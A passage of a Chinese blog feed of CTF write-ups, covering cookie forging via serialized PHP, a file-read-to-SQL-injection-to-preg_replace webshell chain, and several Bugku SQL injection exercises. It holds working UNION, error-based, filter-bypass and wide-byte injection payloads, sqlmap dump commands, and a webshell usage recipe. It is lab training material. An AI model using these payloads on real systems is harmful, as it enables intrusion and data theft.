class="hljs-string">&#x27;O:5:&quot;human&quot;:10:&#123;s:8:&quot;xueliang&quot;;i:830;s:5:&quot;neili&quot;;i:602;s:5:&quot;lidao&quot;;i:95;s:6:&quot;dingli&quot;;i:63;s:7:&quot;waigong&quot;;i:0;s:7:&quot;neigong&quot;;i:0;s:7:&quot;jingyan&quot;;i:0;s:6:&quot;yelian&quot;;i:0;s:5:&quot;money&quot;;i:200000;s:4:&quot;flag&quot;;s:1:&quot;0&quot;;&#125;&#x27;</span>;</span><span class="javascript"><span class="hljs-comment">//åç¼–ç è·å–cookie</span></span><span class="javascript"><span class="hljs-keyword">var</span> result = <span class="hljs-string">&quot;&quot;</span>;</span>for (i = 0;i&lt;result3.length;i++)&#123;num = result3[i].charCodeAt();num = num + ((i % 10) + 2);num = num ^ i;<span class="javascript">result += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>&#125;<span class="javascript"><span class="hljs-keyword">var</span> temp= base.encode(result);</span><span class="javascript"><span class="hljs-comment">//å°†cookieè¿›è¡Œurlç¼–ç </span></span><span class="javascript">temp = <span class="hljs-built_in">encodeURIComponent</span>(temp);</span><span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;cookie:&quot;</span>+temp+<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>ç¼–ç ç»“æœ</p><pre><code class="hljs apache"><span class="hljs-attribute">UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo</span>%<span class="hljs-number">2</span>FBTzBxKbu<span class="hljs-number">6</span>fbrB%<span class="hljs-number">2</span>BH%<span class="hljs-number">2</span>Bps<span class="hljs-number">3</span>nsLrP<span class="hljs-number">6</span>dCs<span class="hljs-number">0</span>LgR<span class="hljs-number">8</span>fj<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>B<span class="hljs-number">6</span>y<span class="hljs-number">3</span>%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>FapJ<span class="hljs-number">3</span>XnJnkjNPf<span class="hljs-number">0</span>NnRjpPD<span class="hljs-number">7</span>paIiIiIhovBiIL<span class="hljs-number">4</span>kNTK<span class="hljs-number">0</span>dea%<span class="hljs-number">2</span>F<span class="hljs-number">7</span>mC%<span class="hljs-number">2</span>B<span class="hljs-number">4</span>bu%<span class="hljs-number">2</span>FOr<span class="hljs-number">1</span>SQ%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D</code></pre><p>è¿™å°±æ˜¯æˆ‘ä»¬æœŸå¾…çš„cookie,ç„¶åç”¨å·¥å…·ä¿®æ”¹cookie</p><p><img src="https://i.loli.net/2020/11/25/WMk48YRo5veBxXr.png" alt="nt-9.png"></p><p>ä¿®æ»¡å±æ€§å€¼æ‰“æ€ªæ‹¿åˆ°flag</p><p><img src="https://i.loli.net/2020/11/25/5Geyh8r7vBDOqKE.png" alt="mt-10.png"></p><p><a href="https://blog.csdn.net/weixin_41924764/article/details/109488408?utm_medium=distribute.pc_relevant.none-task-blog-title-2&spm=1001.2101.3001.4242">å‚è€ƒ</a></p><p>è¿™é“é¢˜è™½ç„¶å¾ˆéš¾ï¼Œä½†æ˜¯åœ¨ä¸€æ­¥ä¸€æ­¥å°è¯•çš„è¿‡ç¨‹ä¸­å­¦åˆ°å¾ˆå¤šæœ‰ç”¨çš„ä¸œè¥¿ï¼Œæ”¶è·è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œæ„Ÿè°¢å¸ˆå‚…çš„wpï¼Œçœ‹äº†å¥½ä¹…æ‰åšå‡ºäº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è„šæœ¬</tag>
      
      <tag>php</tag>
      
      <tag>cookie</tag>
      
      <tag>ç¼–ç </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç»¼åˆ2</title>
    <link href="/2020/09/03/%E7%BB%BC%E5%90%882/"/>
    <url>/2020/09/03/%E7%BB%BC%E5%90%882/</url>
    
    <content type="html"><![CDATA[<h1 id="NCTF-ç»¼åˆ2"><a href="#NCTF-ç»¼åˆ2" class="headerlink" title="NCTF-ç»¼åˆ2"></a>NCTF-ç»¼åˆ2</h1><span id="more"></span><p>è¿›å…¥é¡µé¢ï¼Œæ²¡ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ï¼Œéšä¾¿ç‚¹ç‚¹</p><p><img src="https://i.loli.net/2020/11/30/9Vf7JA3OWC68arb.png" alt></p><p>ç•™è¨€å¯ä»¥æ­£å¸¸æäº¤ï¼Œæœ¬ä»¥ä¸ºæœ‰xss,ä½†æ˜¯å·²ç»æç¤ºä¸æ˜¯xss</p><p>çœ‹åˆ°æœ€ä¸‹é¢æœ‰ä¸ªç½‘ç«™è¯´æ˜   <a href="http://cms.nuptzj.cn/about.php?file=sm.txt">æœ¬CMSè¯´æ˜</a>  ï¼Œæœ‰ç”¨çš„å†…å®¹å¦‚ä¸‹</p><blockquote><p>config.phpï¼šå­˜æ”¾æ•°æ®åº“ä¿¡æ¯ï¼Œç§»æ¤æ­¤CMSæ—¶è¦ä¿®æ”¹ </p><p>index.phpï¼šä¸»é¡µæ–‡ä»¶ </p><p>passencode.phpï¼šFunnyå…¬å¸è‡ªå†™å¯†ç åŠ å¯†ç®—æ³•åº“ </p><p>say.phpï¼šç”¨äºæ¥æ”¶å’Œå¤„ç†ç”¨æˆ·ç•™è¨€è¯·æ±‚ </p><p>sm.txtï¼šæœ¬CMSçš„è¯´æ˜æ–‡æ¡£ saeçš„information_schemaè¡¨å¥½åƒæ²¡æ³•æ£€ç´¢</p><p>adminè¡¨ç»“æ„ create table admin ( id integer, username text, userpass text, )  </p></blockquote><p> <code>http://cms.nuptzj.cn/about.php?file=sm.txt</code>å¯ä»¥ä½¿ç”¨phpä¼ªåè®®ä»»æ„è¯»å–æ–‡ä»¶å†…å®¹ã€‚ åŒ…æ‹¬è‡ªå·±</p><p>å°è¯•è¯»å–index.phpçš„æºç ï¼Œå‘ç°å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨</p><p>è¯»å–<code>about.php</code></p><pre><code class="hljs php+HTML">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;&lt;?php$file&#x3D;$_GET[&#39;file&#39;];if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123;   &#x2F;&#x2F; æœ‰config.phpecho &quot;fileå‚æ•°ä¸èƒ½ä¸ºç©ºï¼&quot;;exit();&#125;else&#123;$cut&#x3D;strchr($file,&quot;loginxlcteam&quot;);   &#x2F;&#x2F;åŒ…å«äº† loginxlcteamé¡µé¢if($cut&#x3D;&#x3D;false)&#123;$data&#x3D;file_get_contents($file);$date&#x3D;htmlspecialchars($data);echo $date;&#125;else&#123;echo &quot;&lt;script&gt;alert(&#39;æ•æ„Ÿç›®å½•ï¼Œç¦æ­¢æŸ¥çœ‹ï¼ä½†æ˜¯ã€‚ã€‚ã€‚&#39;)&lt;&#x2F;script&gt;&quot;;&#125;&#125;</code></pre><p>è¯»å–config.phpï¼Œæ— æœ‰ç”¨ä¿¡æ¯</p><p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/2.png" alt></p><p>æŸ¥çœ‹<code>loginxlcteam</code>,æ˜¯ä¸ªç™»å½•é¡µé¢</p><p><img src="https://i.loli.net/2020/12/04/LfWepcHgMhxl8AF.png" alt></p><p>åˆ°æ­¤è¿˜æ˜¯æ— ä»ä¸‹æ‰‹ï¼Œå‚è€ƒå¤§ä½¬çš„åšå®¢ <a href="https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase">https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase</a> </p><p>åœ¨æœç´¢é¡µé¢ä¸­ä¹Ÿå­˜åœ¨æœ‰ç”¨ä¿¡æ¯</p><p> <code>http://cms.nuptzj.cn/about.php?file=so.php</code>è·å–æºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">//so.php</span><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>]!=<span class="hljs-string">&quot;Xlcteam Browser&quot;</span>)&#123;     <span class="hljs-comment">//å¿…é¡»ä¿®æ”¹httpå¤´ï¼Œå§user-agentæ”¹æˆXlcteam Browser</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ä¸‡æ¶æ»´é»‘é˜”ï¼Œæœ¬åŠŸèƒ½åªæœ‰ç”¨æœ¬å…¬å¸å¼€å‘çš„æµè§ˆå™¨æ‰å¯ä»¥ç”¨å–”~&#x27;</span>;    <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;soid&#x27;</span>];<span class="hljs-comment">//post ä¸€ä¸ªsoid</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;antiinject.php&#x27;</span>;   <span class="hljs-comment">//é˜²æ³¨å…¥çš„æ–‡ä»¶</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;antixss.php&#x27;</span>;      <span class="hljs-comment">//é˜²xssçš„æ–‡ä»¶</span><span class="hljs-variable">$id</span>=antiinject(<span class="hljs-variable">$id</span>);<span class="hljs-comment">//å¯¹idè¿‡æ»¤</span><span class="hljs-variable">$con</span> = mysql_connect(<span class="hljs-variable">$db_address</span>,<span class="hljs-variable">$db_user</span>,<span class="hljs-variable">$db_pass</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä¸èƒ½è¿æ¥åˆ°æ•°æ®åº“ï¼ï¼&quot;</span>.mysql_error());mysql_select_db(<span class="hljs-variable">$db_name</span>,<span class="hljs-variable">$con</span>);<span class="hljs-variable">$id</span>=mysql_real_escape_string(<span class="hljs-variable">$id</span>);<span class="hljs-variable">$result</span>=mysql_query(<span class="hljs-string">&quot;SELECT * FROM `message` WHERE display=1 AND id=<span class="hljs-subst">$id</span>&quot;</span>);  <span class="hljs-comment">//sqlæŸ¥è¯¢ï¼Œå¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹</span><span class="hljs-variable">$rs</span>=mysql_fetch_array(<span class="hljs-variable">$result</span>);<span class="hljs-keyword">echo</span> htmlspecialchars(<span class="hljs-variable">$rs</span>[<span class="hljs-string">&#x27;nice&#x27;</span>]).<span class="hljs-string">&#x27;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#x27;</span>.antixss(<span class="hljs-variable">$rs</span>[<span class="hljs-string">&#x27;say&#x27;</span>]).<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;mysql_free_result(<span class="hljs-variable">$result</span>);mysql_free_result(<span class="hljs-variable">$file</span>);mysql_close(<span class="hljs-variable">$con</span>);<span class="hljs-meta">?&gt;</span></code></pre><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-comment">//antiinject.phpæºç </span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">antiinject</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span><span class="hljs-function"> </span>&#123;  <span class="hljs-variable">$keyword</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;select&quot;</span>,<span class="hljs-string">&quot;union&quot;</span>,<span class="hljs-string">&quot;and&quot;</span>,<span class="hljs-string">&quot;from&quot;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&quot;char&quot;</span>,<span class="hljs-string">&quot;or&quot;</span>,<span class="hljs-string">&quot;count&quot;</span>,<span class="hljs-string">&quot;master&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;order&quot;</span>,<span class="hljs-string">&quot;=&quot;</span>); <span class="hljs-comment">//å¯¹ä¸€äº›sqlæ³¨å…¥æ—¶ç”¨åˆ°çš„å…³é”®è¯è¿›è¡Œäº†è¿‡æ»¤</span>     <span class="hljs-variable">$info</span>=strtolower(<span class="hljs-variable">$content</span>);  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=count(<span class="hljs-variable">$keyword</span>);<span class="hljs-variable">$i</span>++) &#123;  <span class="hljs-variable">$info</span>=str_replace(<span class="hljs-variable">$keyword</span>[<span class="hljs-variable">$i</span>], <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$info</span>);  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-variable">$info</span>;  &#125;  <span class="hljs-meta">?&gt;</span></code></pre><p>å¤§è‡´æ„æ€å°±æ˜¯</p><p>1.åˆ¤æ–­httpè¯·æ±‚å¤´ä¸­çš„user-agentå‚æ•°æ˜¯å¦ä¸ºXlcteam Browser</p><p>2.postå‚æ•°soid</p><p>3.å¯¹soidè¿›è¡Œè¿‡æ»¤åå¸¦å…¥sqlè¯­å¥ä¸­æŸ¥è¯¢</p><p>äºæ˜¯æŠ“åŒ…ä¿®æ”¹user-agent</p><p>ç¡®å®šå­˜åœ¨æ³¨å…¥ç‚¹</p><p><img src="https://i.loli.net/2020/11/30/KGcINOm5XAxVhDE.png" alt></p><p>ç”±äºä¹‹å‰æç¤ºäº†<strong>adminè¡¨ç»“æ„ create table admin ( id integer, username text, userpass text, )</strong>  </p><p>å¯ç›´æ¥å†™å‡ºæŸ¥è¯¢è¯­å¥</p><pre><code class="hljs awk">(sselectelect<span class="hljs-regexp">/**/g</span>roup_concat(userppassass)<span class="hljs-regexp">/**/</span>ffromrom<span class="hljs-regexp">/**/</span>aadmindmin)</code></pre><p><img src="https://i.loli.net/2020/11/30/wMtHrAcuYVWOn91.png" alt></p><p>ASCIIç è½¬å­—ç¬¦ä¸²ç»“æœä¸ºï¼š fuckruntu </p><p>ç™»å½•</p><p><img src="https://i.loli.net/2020/11/30/qZmL6EeW8O3MsYX.png" alt></p><p> <strong><a href="http://cms.nuptzj.cn/about.php?file=xlcteam.php">http://cms.nuptzj.cn/about.php?file=xlcteam.php</a></strong>  æŸ¥çœ‹æºç </p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;www&#x27;</span>]; <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;wtf&#x27;</span>] =&gt; <span class="hljs-string">&#x27;|.*|e&#x27;</span>,); array_walk(<span class="hljs-variable">$arr</span>, <span class="hljs-variable">$e</span>, <span class="hljs-string">&#x27;&#x27;</span>); <span class="hljs-meta">?&gt;</span></code></pre><p>çœ‹æ ·å­æ˜¯å¯ä»¥ç”¨èœåˆ€è¿æ¥çš„</p><p> é‚£æ€ä¹ˆåˆ©ç”¨å°é©¬å‘¢ï¼Œæ•°ç»„çš„valueä¸­æ˜¯|.*|eï¼Œè¿™é‡Œç”¨åˆ°äº†æ­£åˆ™åŒ¹é…çš„preg_replace()çš„ä¸€ä¸ªæ¼æ´ï¼š<br>å‚è€ƒ<a href="https://www.jb51.net/article/38714.htm">https://www.jb51.net/article/38714.htm</a><br>ç®€å•æ¥è¯´å°±æ˜¯æ­£åˆ™ä¸­/e(è¿™é‡Œå’Œ|eæ•ˆæœä¸€æ ·) ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç ï¼ˆåœ¨é€‚å½“çš„é€†å‘å¼•ç”¨æ›¿æ¢å®Œä¹‹åï¼‰ã€‚æç¤ºï¼šè¦ç¡®ä¿ replacement æ„æˆä¸€ä¸ªåˆæ³•çš„ PHP ä»£ç å­—ç¬¦ä¸²ï¼Œå¦åˆ™ PHP ä¼šåœ¨æŠ¥å‘Šåœ¨åŒ…å« preg_replace() çš„è¡Œä¸­å‡ºç°è¯­æ³•è§£æé”™è¯¯ã€‚<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ é€’preg_replaceç»™wwwï¼Œè¿™æ ·arrayä¸­çš„å€¼å°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œé”®å°±æ˜¯ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ­£å¥½å¯ä»¥åˆ©ç”¨preg_replaceçš„æ¼æ´ï¼Œç„¶åä¼šæ‰§è¡Œ$_POST[â€˜wtfâ€™]ï¼Œå°±ç›¸å½“äºä¸€ä¸ªä¸€å¥è¯é©¬äº†ã€‚<br>ç”¨èœåˆ€è¿æ¥ï¼š </p><p>url:<a href="http://cms.nuptzj.cn/xlcteam.php?www=preg_replace">http://cms.nuptzj.cn/xlcteam.php?www=preg_replace</a></p><p>å¯†ç ï¼šwtf</p><p><strong>æ€»ç»“ï¼šç®—æ˜¯ä¸€é“æ¯”è¾ƒéš¾çš„é¢˜ç›®äº†ï¼Œæ¶‰åŠåˆ°çŸ¥è¯†ç‚¹ä¹Ÿå¾ˆå¤šï¼Œè¿˜éœ€è¦å¤šçœ‹çœ‹ï¼ï¼ï¼</strong></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>php</tag>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bugku</title>
    <link href="/2020/08/08/Bugku/"/>
    <url>/2020/08/08/Bugku/</url>
    
    <content type="html"><![CDATA[<h1 id="Bugkuåˆ·é¢˜"><a href="#Bugkuåˆ·é¢˜" class="headerlink" title="Bugkuåˆ·é¢˜"></a>Bugkuåˆ·é¢˜</h1><span id="more"></span><h2 id="æˆç»©å•"><a href="#æˆç»©å•" class="headerlink" title="æˆç»©å•"></a>æˆç»©å•</h2><pre><code class="hljs html">1&#x27; and 1=1 #        1&#x27; and 1=2 #</code></pre><p>   ä¸æ˜¾ç¤ºå†…å®¹ï¼Œå¯ä»¥åˆ¤æ–­å­˜åœ¨æ³¨å…¥ç‚¹</p><h2 id="æ‰‹å·¥æ³¨å…¥"><a href="#æ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ‰‹å·¥æ³¨å…¥"></a>æ‰‹å·¥æ³¨å…¥</h2><h3 id="1-1-39-order-by-4-å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ"><a href="#1-1-39-order-by-4-å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ" class="headerlink" title="1.1&#39; order by 4#å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ"></a>1.<code>1&#39; order by 4</code>#å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ</h3><h3 id="2-çˆ†æ•°æ®åº“"><a href="#2-çˆ†æ•°æ®åº“" class="headerlink" title="2.çˆ†æ•°æ®åº“"></a>2.çˆ†æ•°æ®åº“</h3><pre><code>` -1&apos; union select 1,database(),3,4 #`     database:skctf_flag</code></pre><h3 id="3-çˆ†å‡ºè¡¨å"><a href="#3-çˆ†å‡ºè¡¨å" class="headerlink" title="3.çˆ†å‡ºè¡¨å"></a>3.çˆ†å‡ºè¡¨å</h3><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre><p> table:fl4g,sc</p><h3 id="4-å­—æ®µå"><a href="#4-å­—æ®µå" class="headerlink" title="4.å­—æ®µå"></a>4.å­—æ®µå</h3><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre><p> skctf_flag</p><p> å¾—åˆ°flag</p><p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p> <strong>å› ä¸ºæœ¬é¢˜æäº¤æ•°æ®çš„æ–¹å¼ä¸ºpostï¼Œæ•…éœ€è¦å…ˆç”¨bpæŠ“æ•°æ®åŒ…ï¼Œä¿å­˜åˆ°sqlmapçš„è·¯å¾„ä¸­</strong></p><p><img src="/2020/08/08/Bugku/cjd1.png" alt></p><h3 id="1-è·å–æ•°æ®åº“"><a href="#1-è·å–æ•°æ®åº“" class="headerlink" title="1.è·å–æ•°æ®åº“"></a>1.è·å–æ•°æ®åº“</h3><pre><code>python2 sqlmap.py -r a.txt --dbs</code></pre><p><img src="/2020/08/08/Bugku/cjd2.png" alt></p><h3 id="2-è·å–è¡¨å"><a href="#2-è·å–è¡¨å" class="headerlink" title="2.è·å–è¡¨å"></a>2.è·å–è¡¨å</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag --tables</code></pre><p><img src="/2020/08/08/Bugku/cjd3.png" alt></p><h3 id="3-è·å–åˆ—å"><a href="#3-è·å–åˆ—å" class="headerlink" title="3.è·å–åˆ—å"></a>3.è·å–åˆ—å</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns</code></pre><p><img src="/2020/08/08/Bugku/cjd4.png" alt></p><h3 id="4-è·å–flag"><a href="#4-è·å–flag" class="headerlink" title="4.è·å–flag"></a>4.è·å–flag</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump</code></pre><p><img src="/2020/08/08/Bugku/cjd5.png" alt></p><hr><h2 id="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"><a href="#å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯" class="headerlink" title="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"></a>å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</h2><p> æ‰«æå‘ç°äº†index.phpï¼Œé€šè¿‡  index.php.bakä¸‹è½½ç½‘é¡µæºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/**</span><span class="hljs-comment"> * Created by PhpStorm.</span><span class="hljs-comment"> * User: Norse</span><span class="hljs-comment"> * Date: 2017/8/6</span><span class="hljs-comment"> * Time: 20:22</span><span class="hljs-comment">*/</span><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-variable">$str</span> = strstr(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>], <span class="hljs-string">&#x27;?&#x27;</span>);<span class="hljs-variable">$str</span> = substr(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$str</span>);parse_str(<span class="hljs-variable">$str</span>);<span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key1</span>);<span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key2</span>);<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$key1</span>) == md5(<span class="hljs-variable">$key2</span>) &amp;&amp; <span class="hljs-variable">$key1</span> !== <span class="hljs-variable">$key2</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;å–å¾—flag&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p> å¯¹ä¸Šä¼ çš„å€¼è¿›è¡Œäº†è¿‡æ»¤key, kekeyyå¯ä»¥ç»•è¿‡</p><p> 1.md5å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå°†ä¸¤ä¸ªå‚æ•°è®¾ç½®ä¸ºæ•°ç»„ç±»å‹ç»è¿‡md5å‡½æ•°åŠ å¯†åéƒ½ä¸ºNULLæ•…äºŒè€…ç›¸ç­‰<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p><p> 2.åˆ©ç”¨==æ¯”è¾ƒæ¼æ´</p><p> å¦‚æœä¸¤ä¸ªå­—ç¬¦ç»MD5åŠ å¯†åçš„å€¼ä¸º 0exxxxxå½¢å¼ï¼Œå°±ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”è¡¨ç¤ºçš„æ˜¯0*10çš„xxxxæ¬¡æ–¹ï¼Œè¿˜æ˜¯é›¶ï¼Œéƒ½æ˜¯ç›¸ç­‰çš„ã€‚</p><p> ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯0eå¼€å¤´çš„ï¼š</p><pre><code>QNKCDZO240610708s878926199as155964671as214587387as214587387a</code></pre><hr><h2 id="å¤šæ¬¡"><a href="#å¤šæ¬¡" class="headerlink" title="å¤šæ¬¡"></a>å¤šæ¬¡</h2><p>çˆ†æ•°æ®åº“å</p><p>   <code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+</code></p><p>database:<strong>web1002-1</strong></p><p>çˆ†è¡¨å</p><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+</code></pre><p>flag1,hint</p><p>çˆ†å­—æ®µå</p><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos;  --+</code></pre><p>flag1,address<br>è·å–å†…å®¹</p><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</code></pre><p><strong>usOwycTju+FTUUzXosjr</strong></p><p>æäº¤å‘ç°ä¸å¯¹</p><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+</code></pre><p>è·å–addressä¸­çš„å†…å®¹</p><p>./Once_More.php<br>ä¸‹ä¸€å…³åœ°å€<br>å¾—åˆ°å¦å¤–ä¸€ä¸ªåœ°å€</p><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23</code></pre><p>ç»™å‡ºæç¤º<br>XPATH syntax error: â€˜<del>class,flag2</del>â€˜</p><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23</code></pre><p>Unknown column â€˜flag2â€™ in â€˜where clauseâ€™</p><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23</code></pre><p>XPATH syntax error: â€˜<del>flag{Bugku-sql_6s-2i-4t-bug}</del>â€˜</p><p><strong>ï¼ï¼ï¼æ³¨æ„æŠŠflagæ”¹ä¸ºå°å†™å­—æ¯</strong></p><hr><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>é¶åœºï¼š<a href="é¶åœºï¼šhttp://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p><h3 id="ä¸€ã€æ‰‹å·¥æ³¨å…¥"><a href="#ä¸€ã€æ‰‹å·¥æ³¨å…¥" class="headerlink" title="ä¸€ã€æ‰‹å·¥æ³¨å…¥"></a>ä¸€ã€æ‰‹å·¥æ³¨å…¥</h3><p>ç¬¬ä¸€æ­¥</p><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code></pre><p>åŠ å•å¼•å·æŠ¥é”™</p><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,table_name from information_schema.tables where  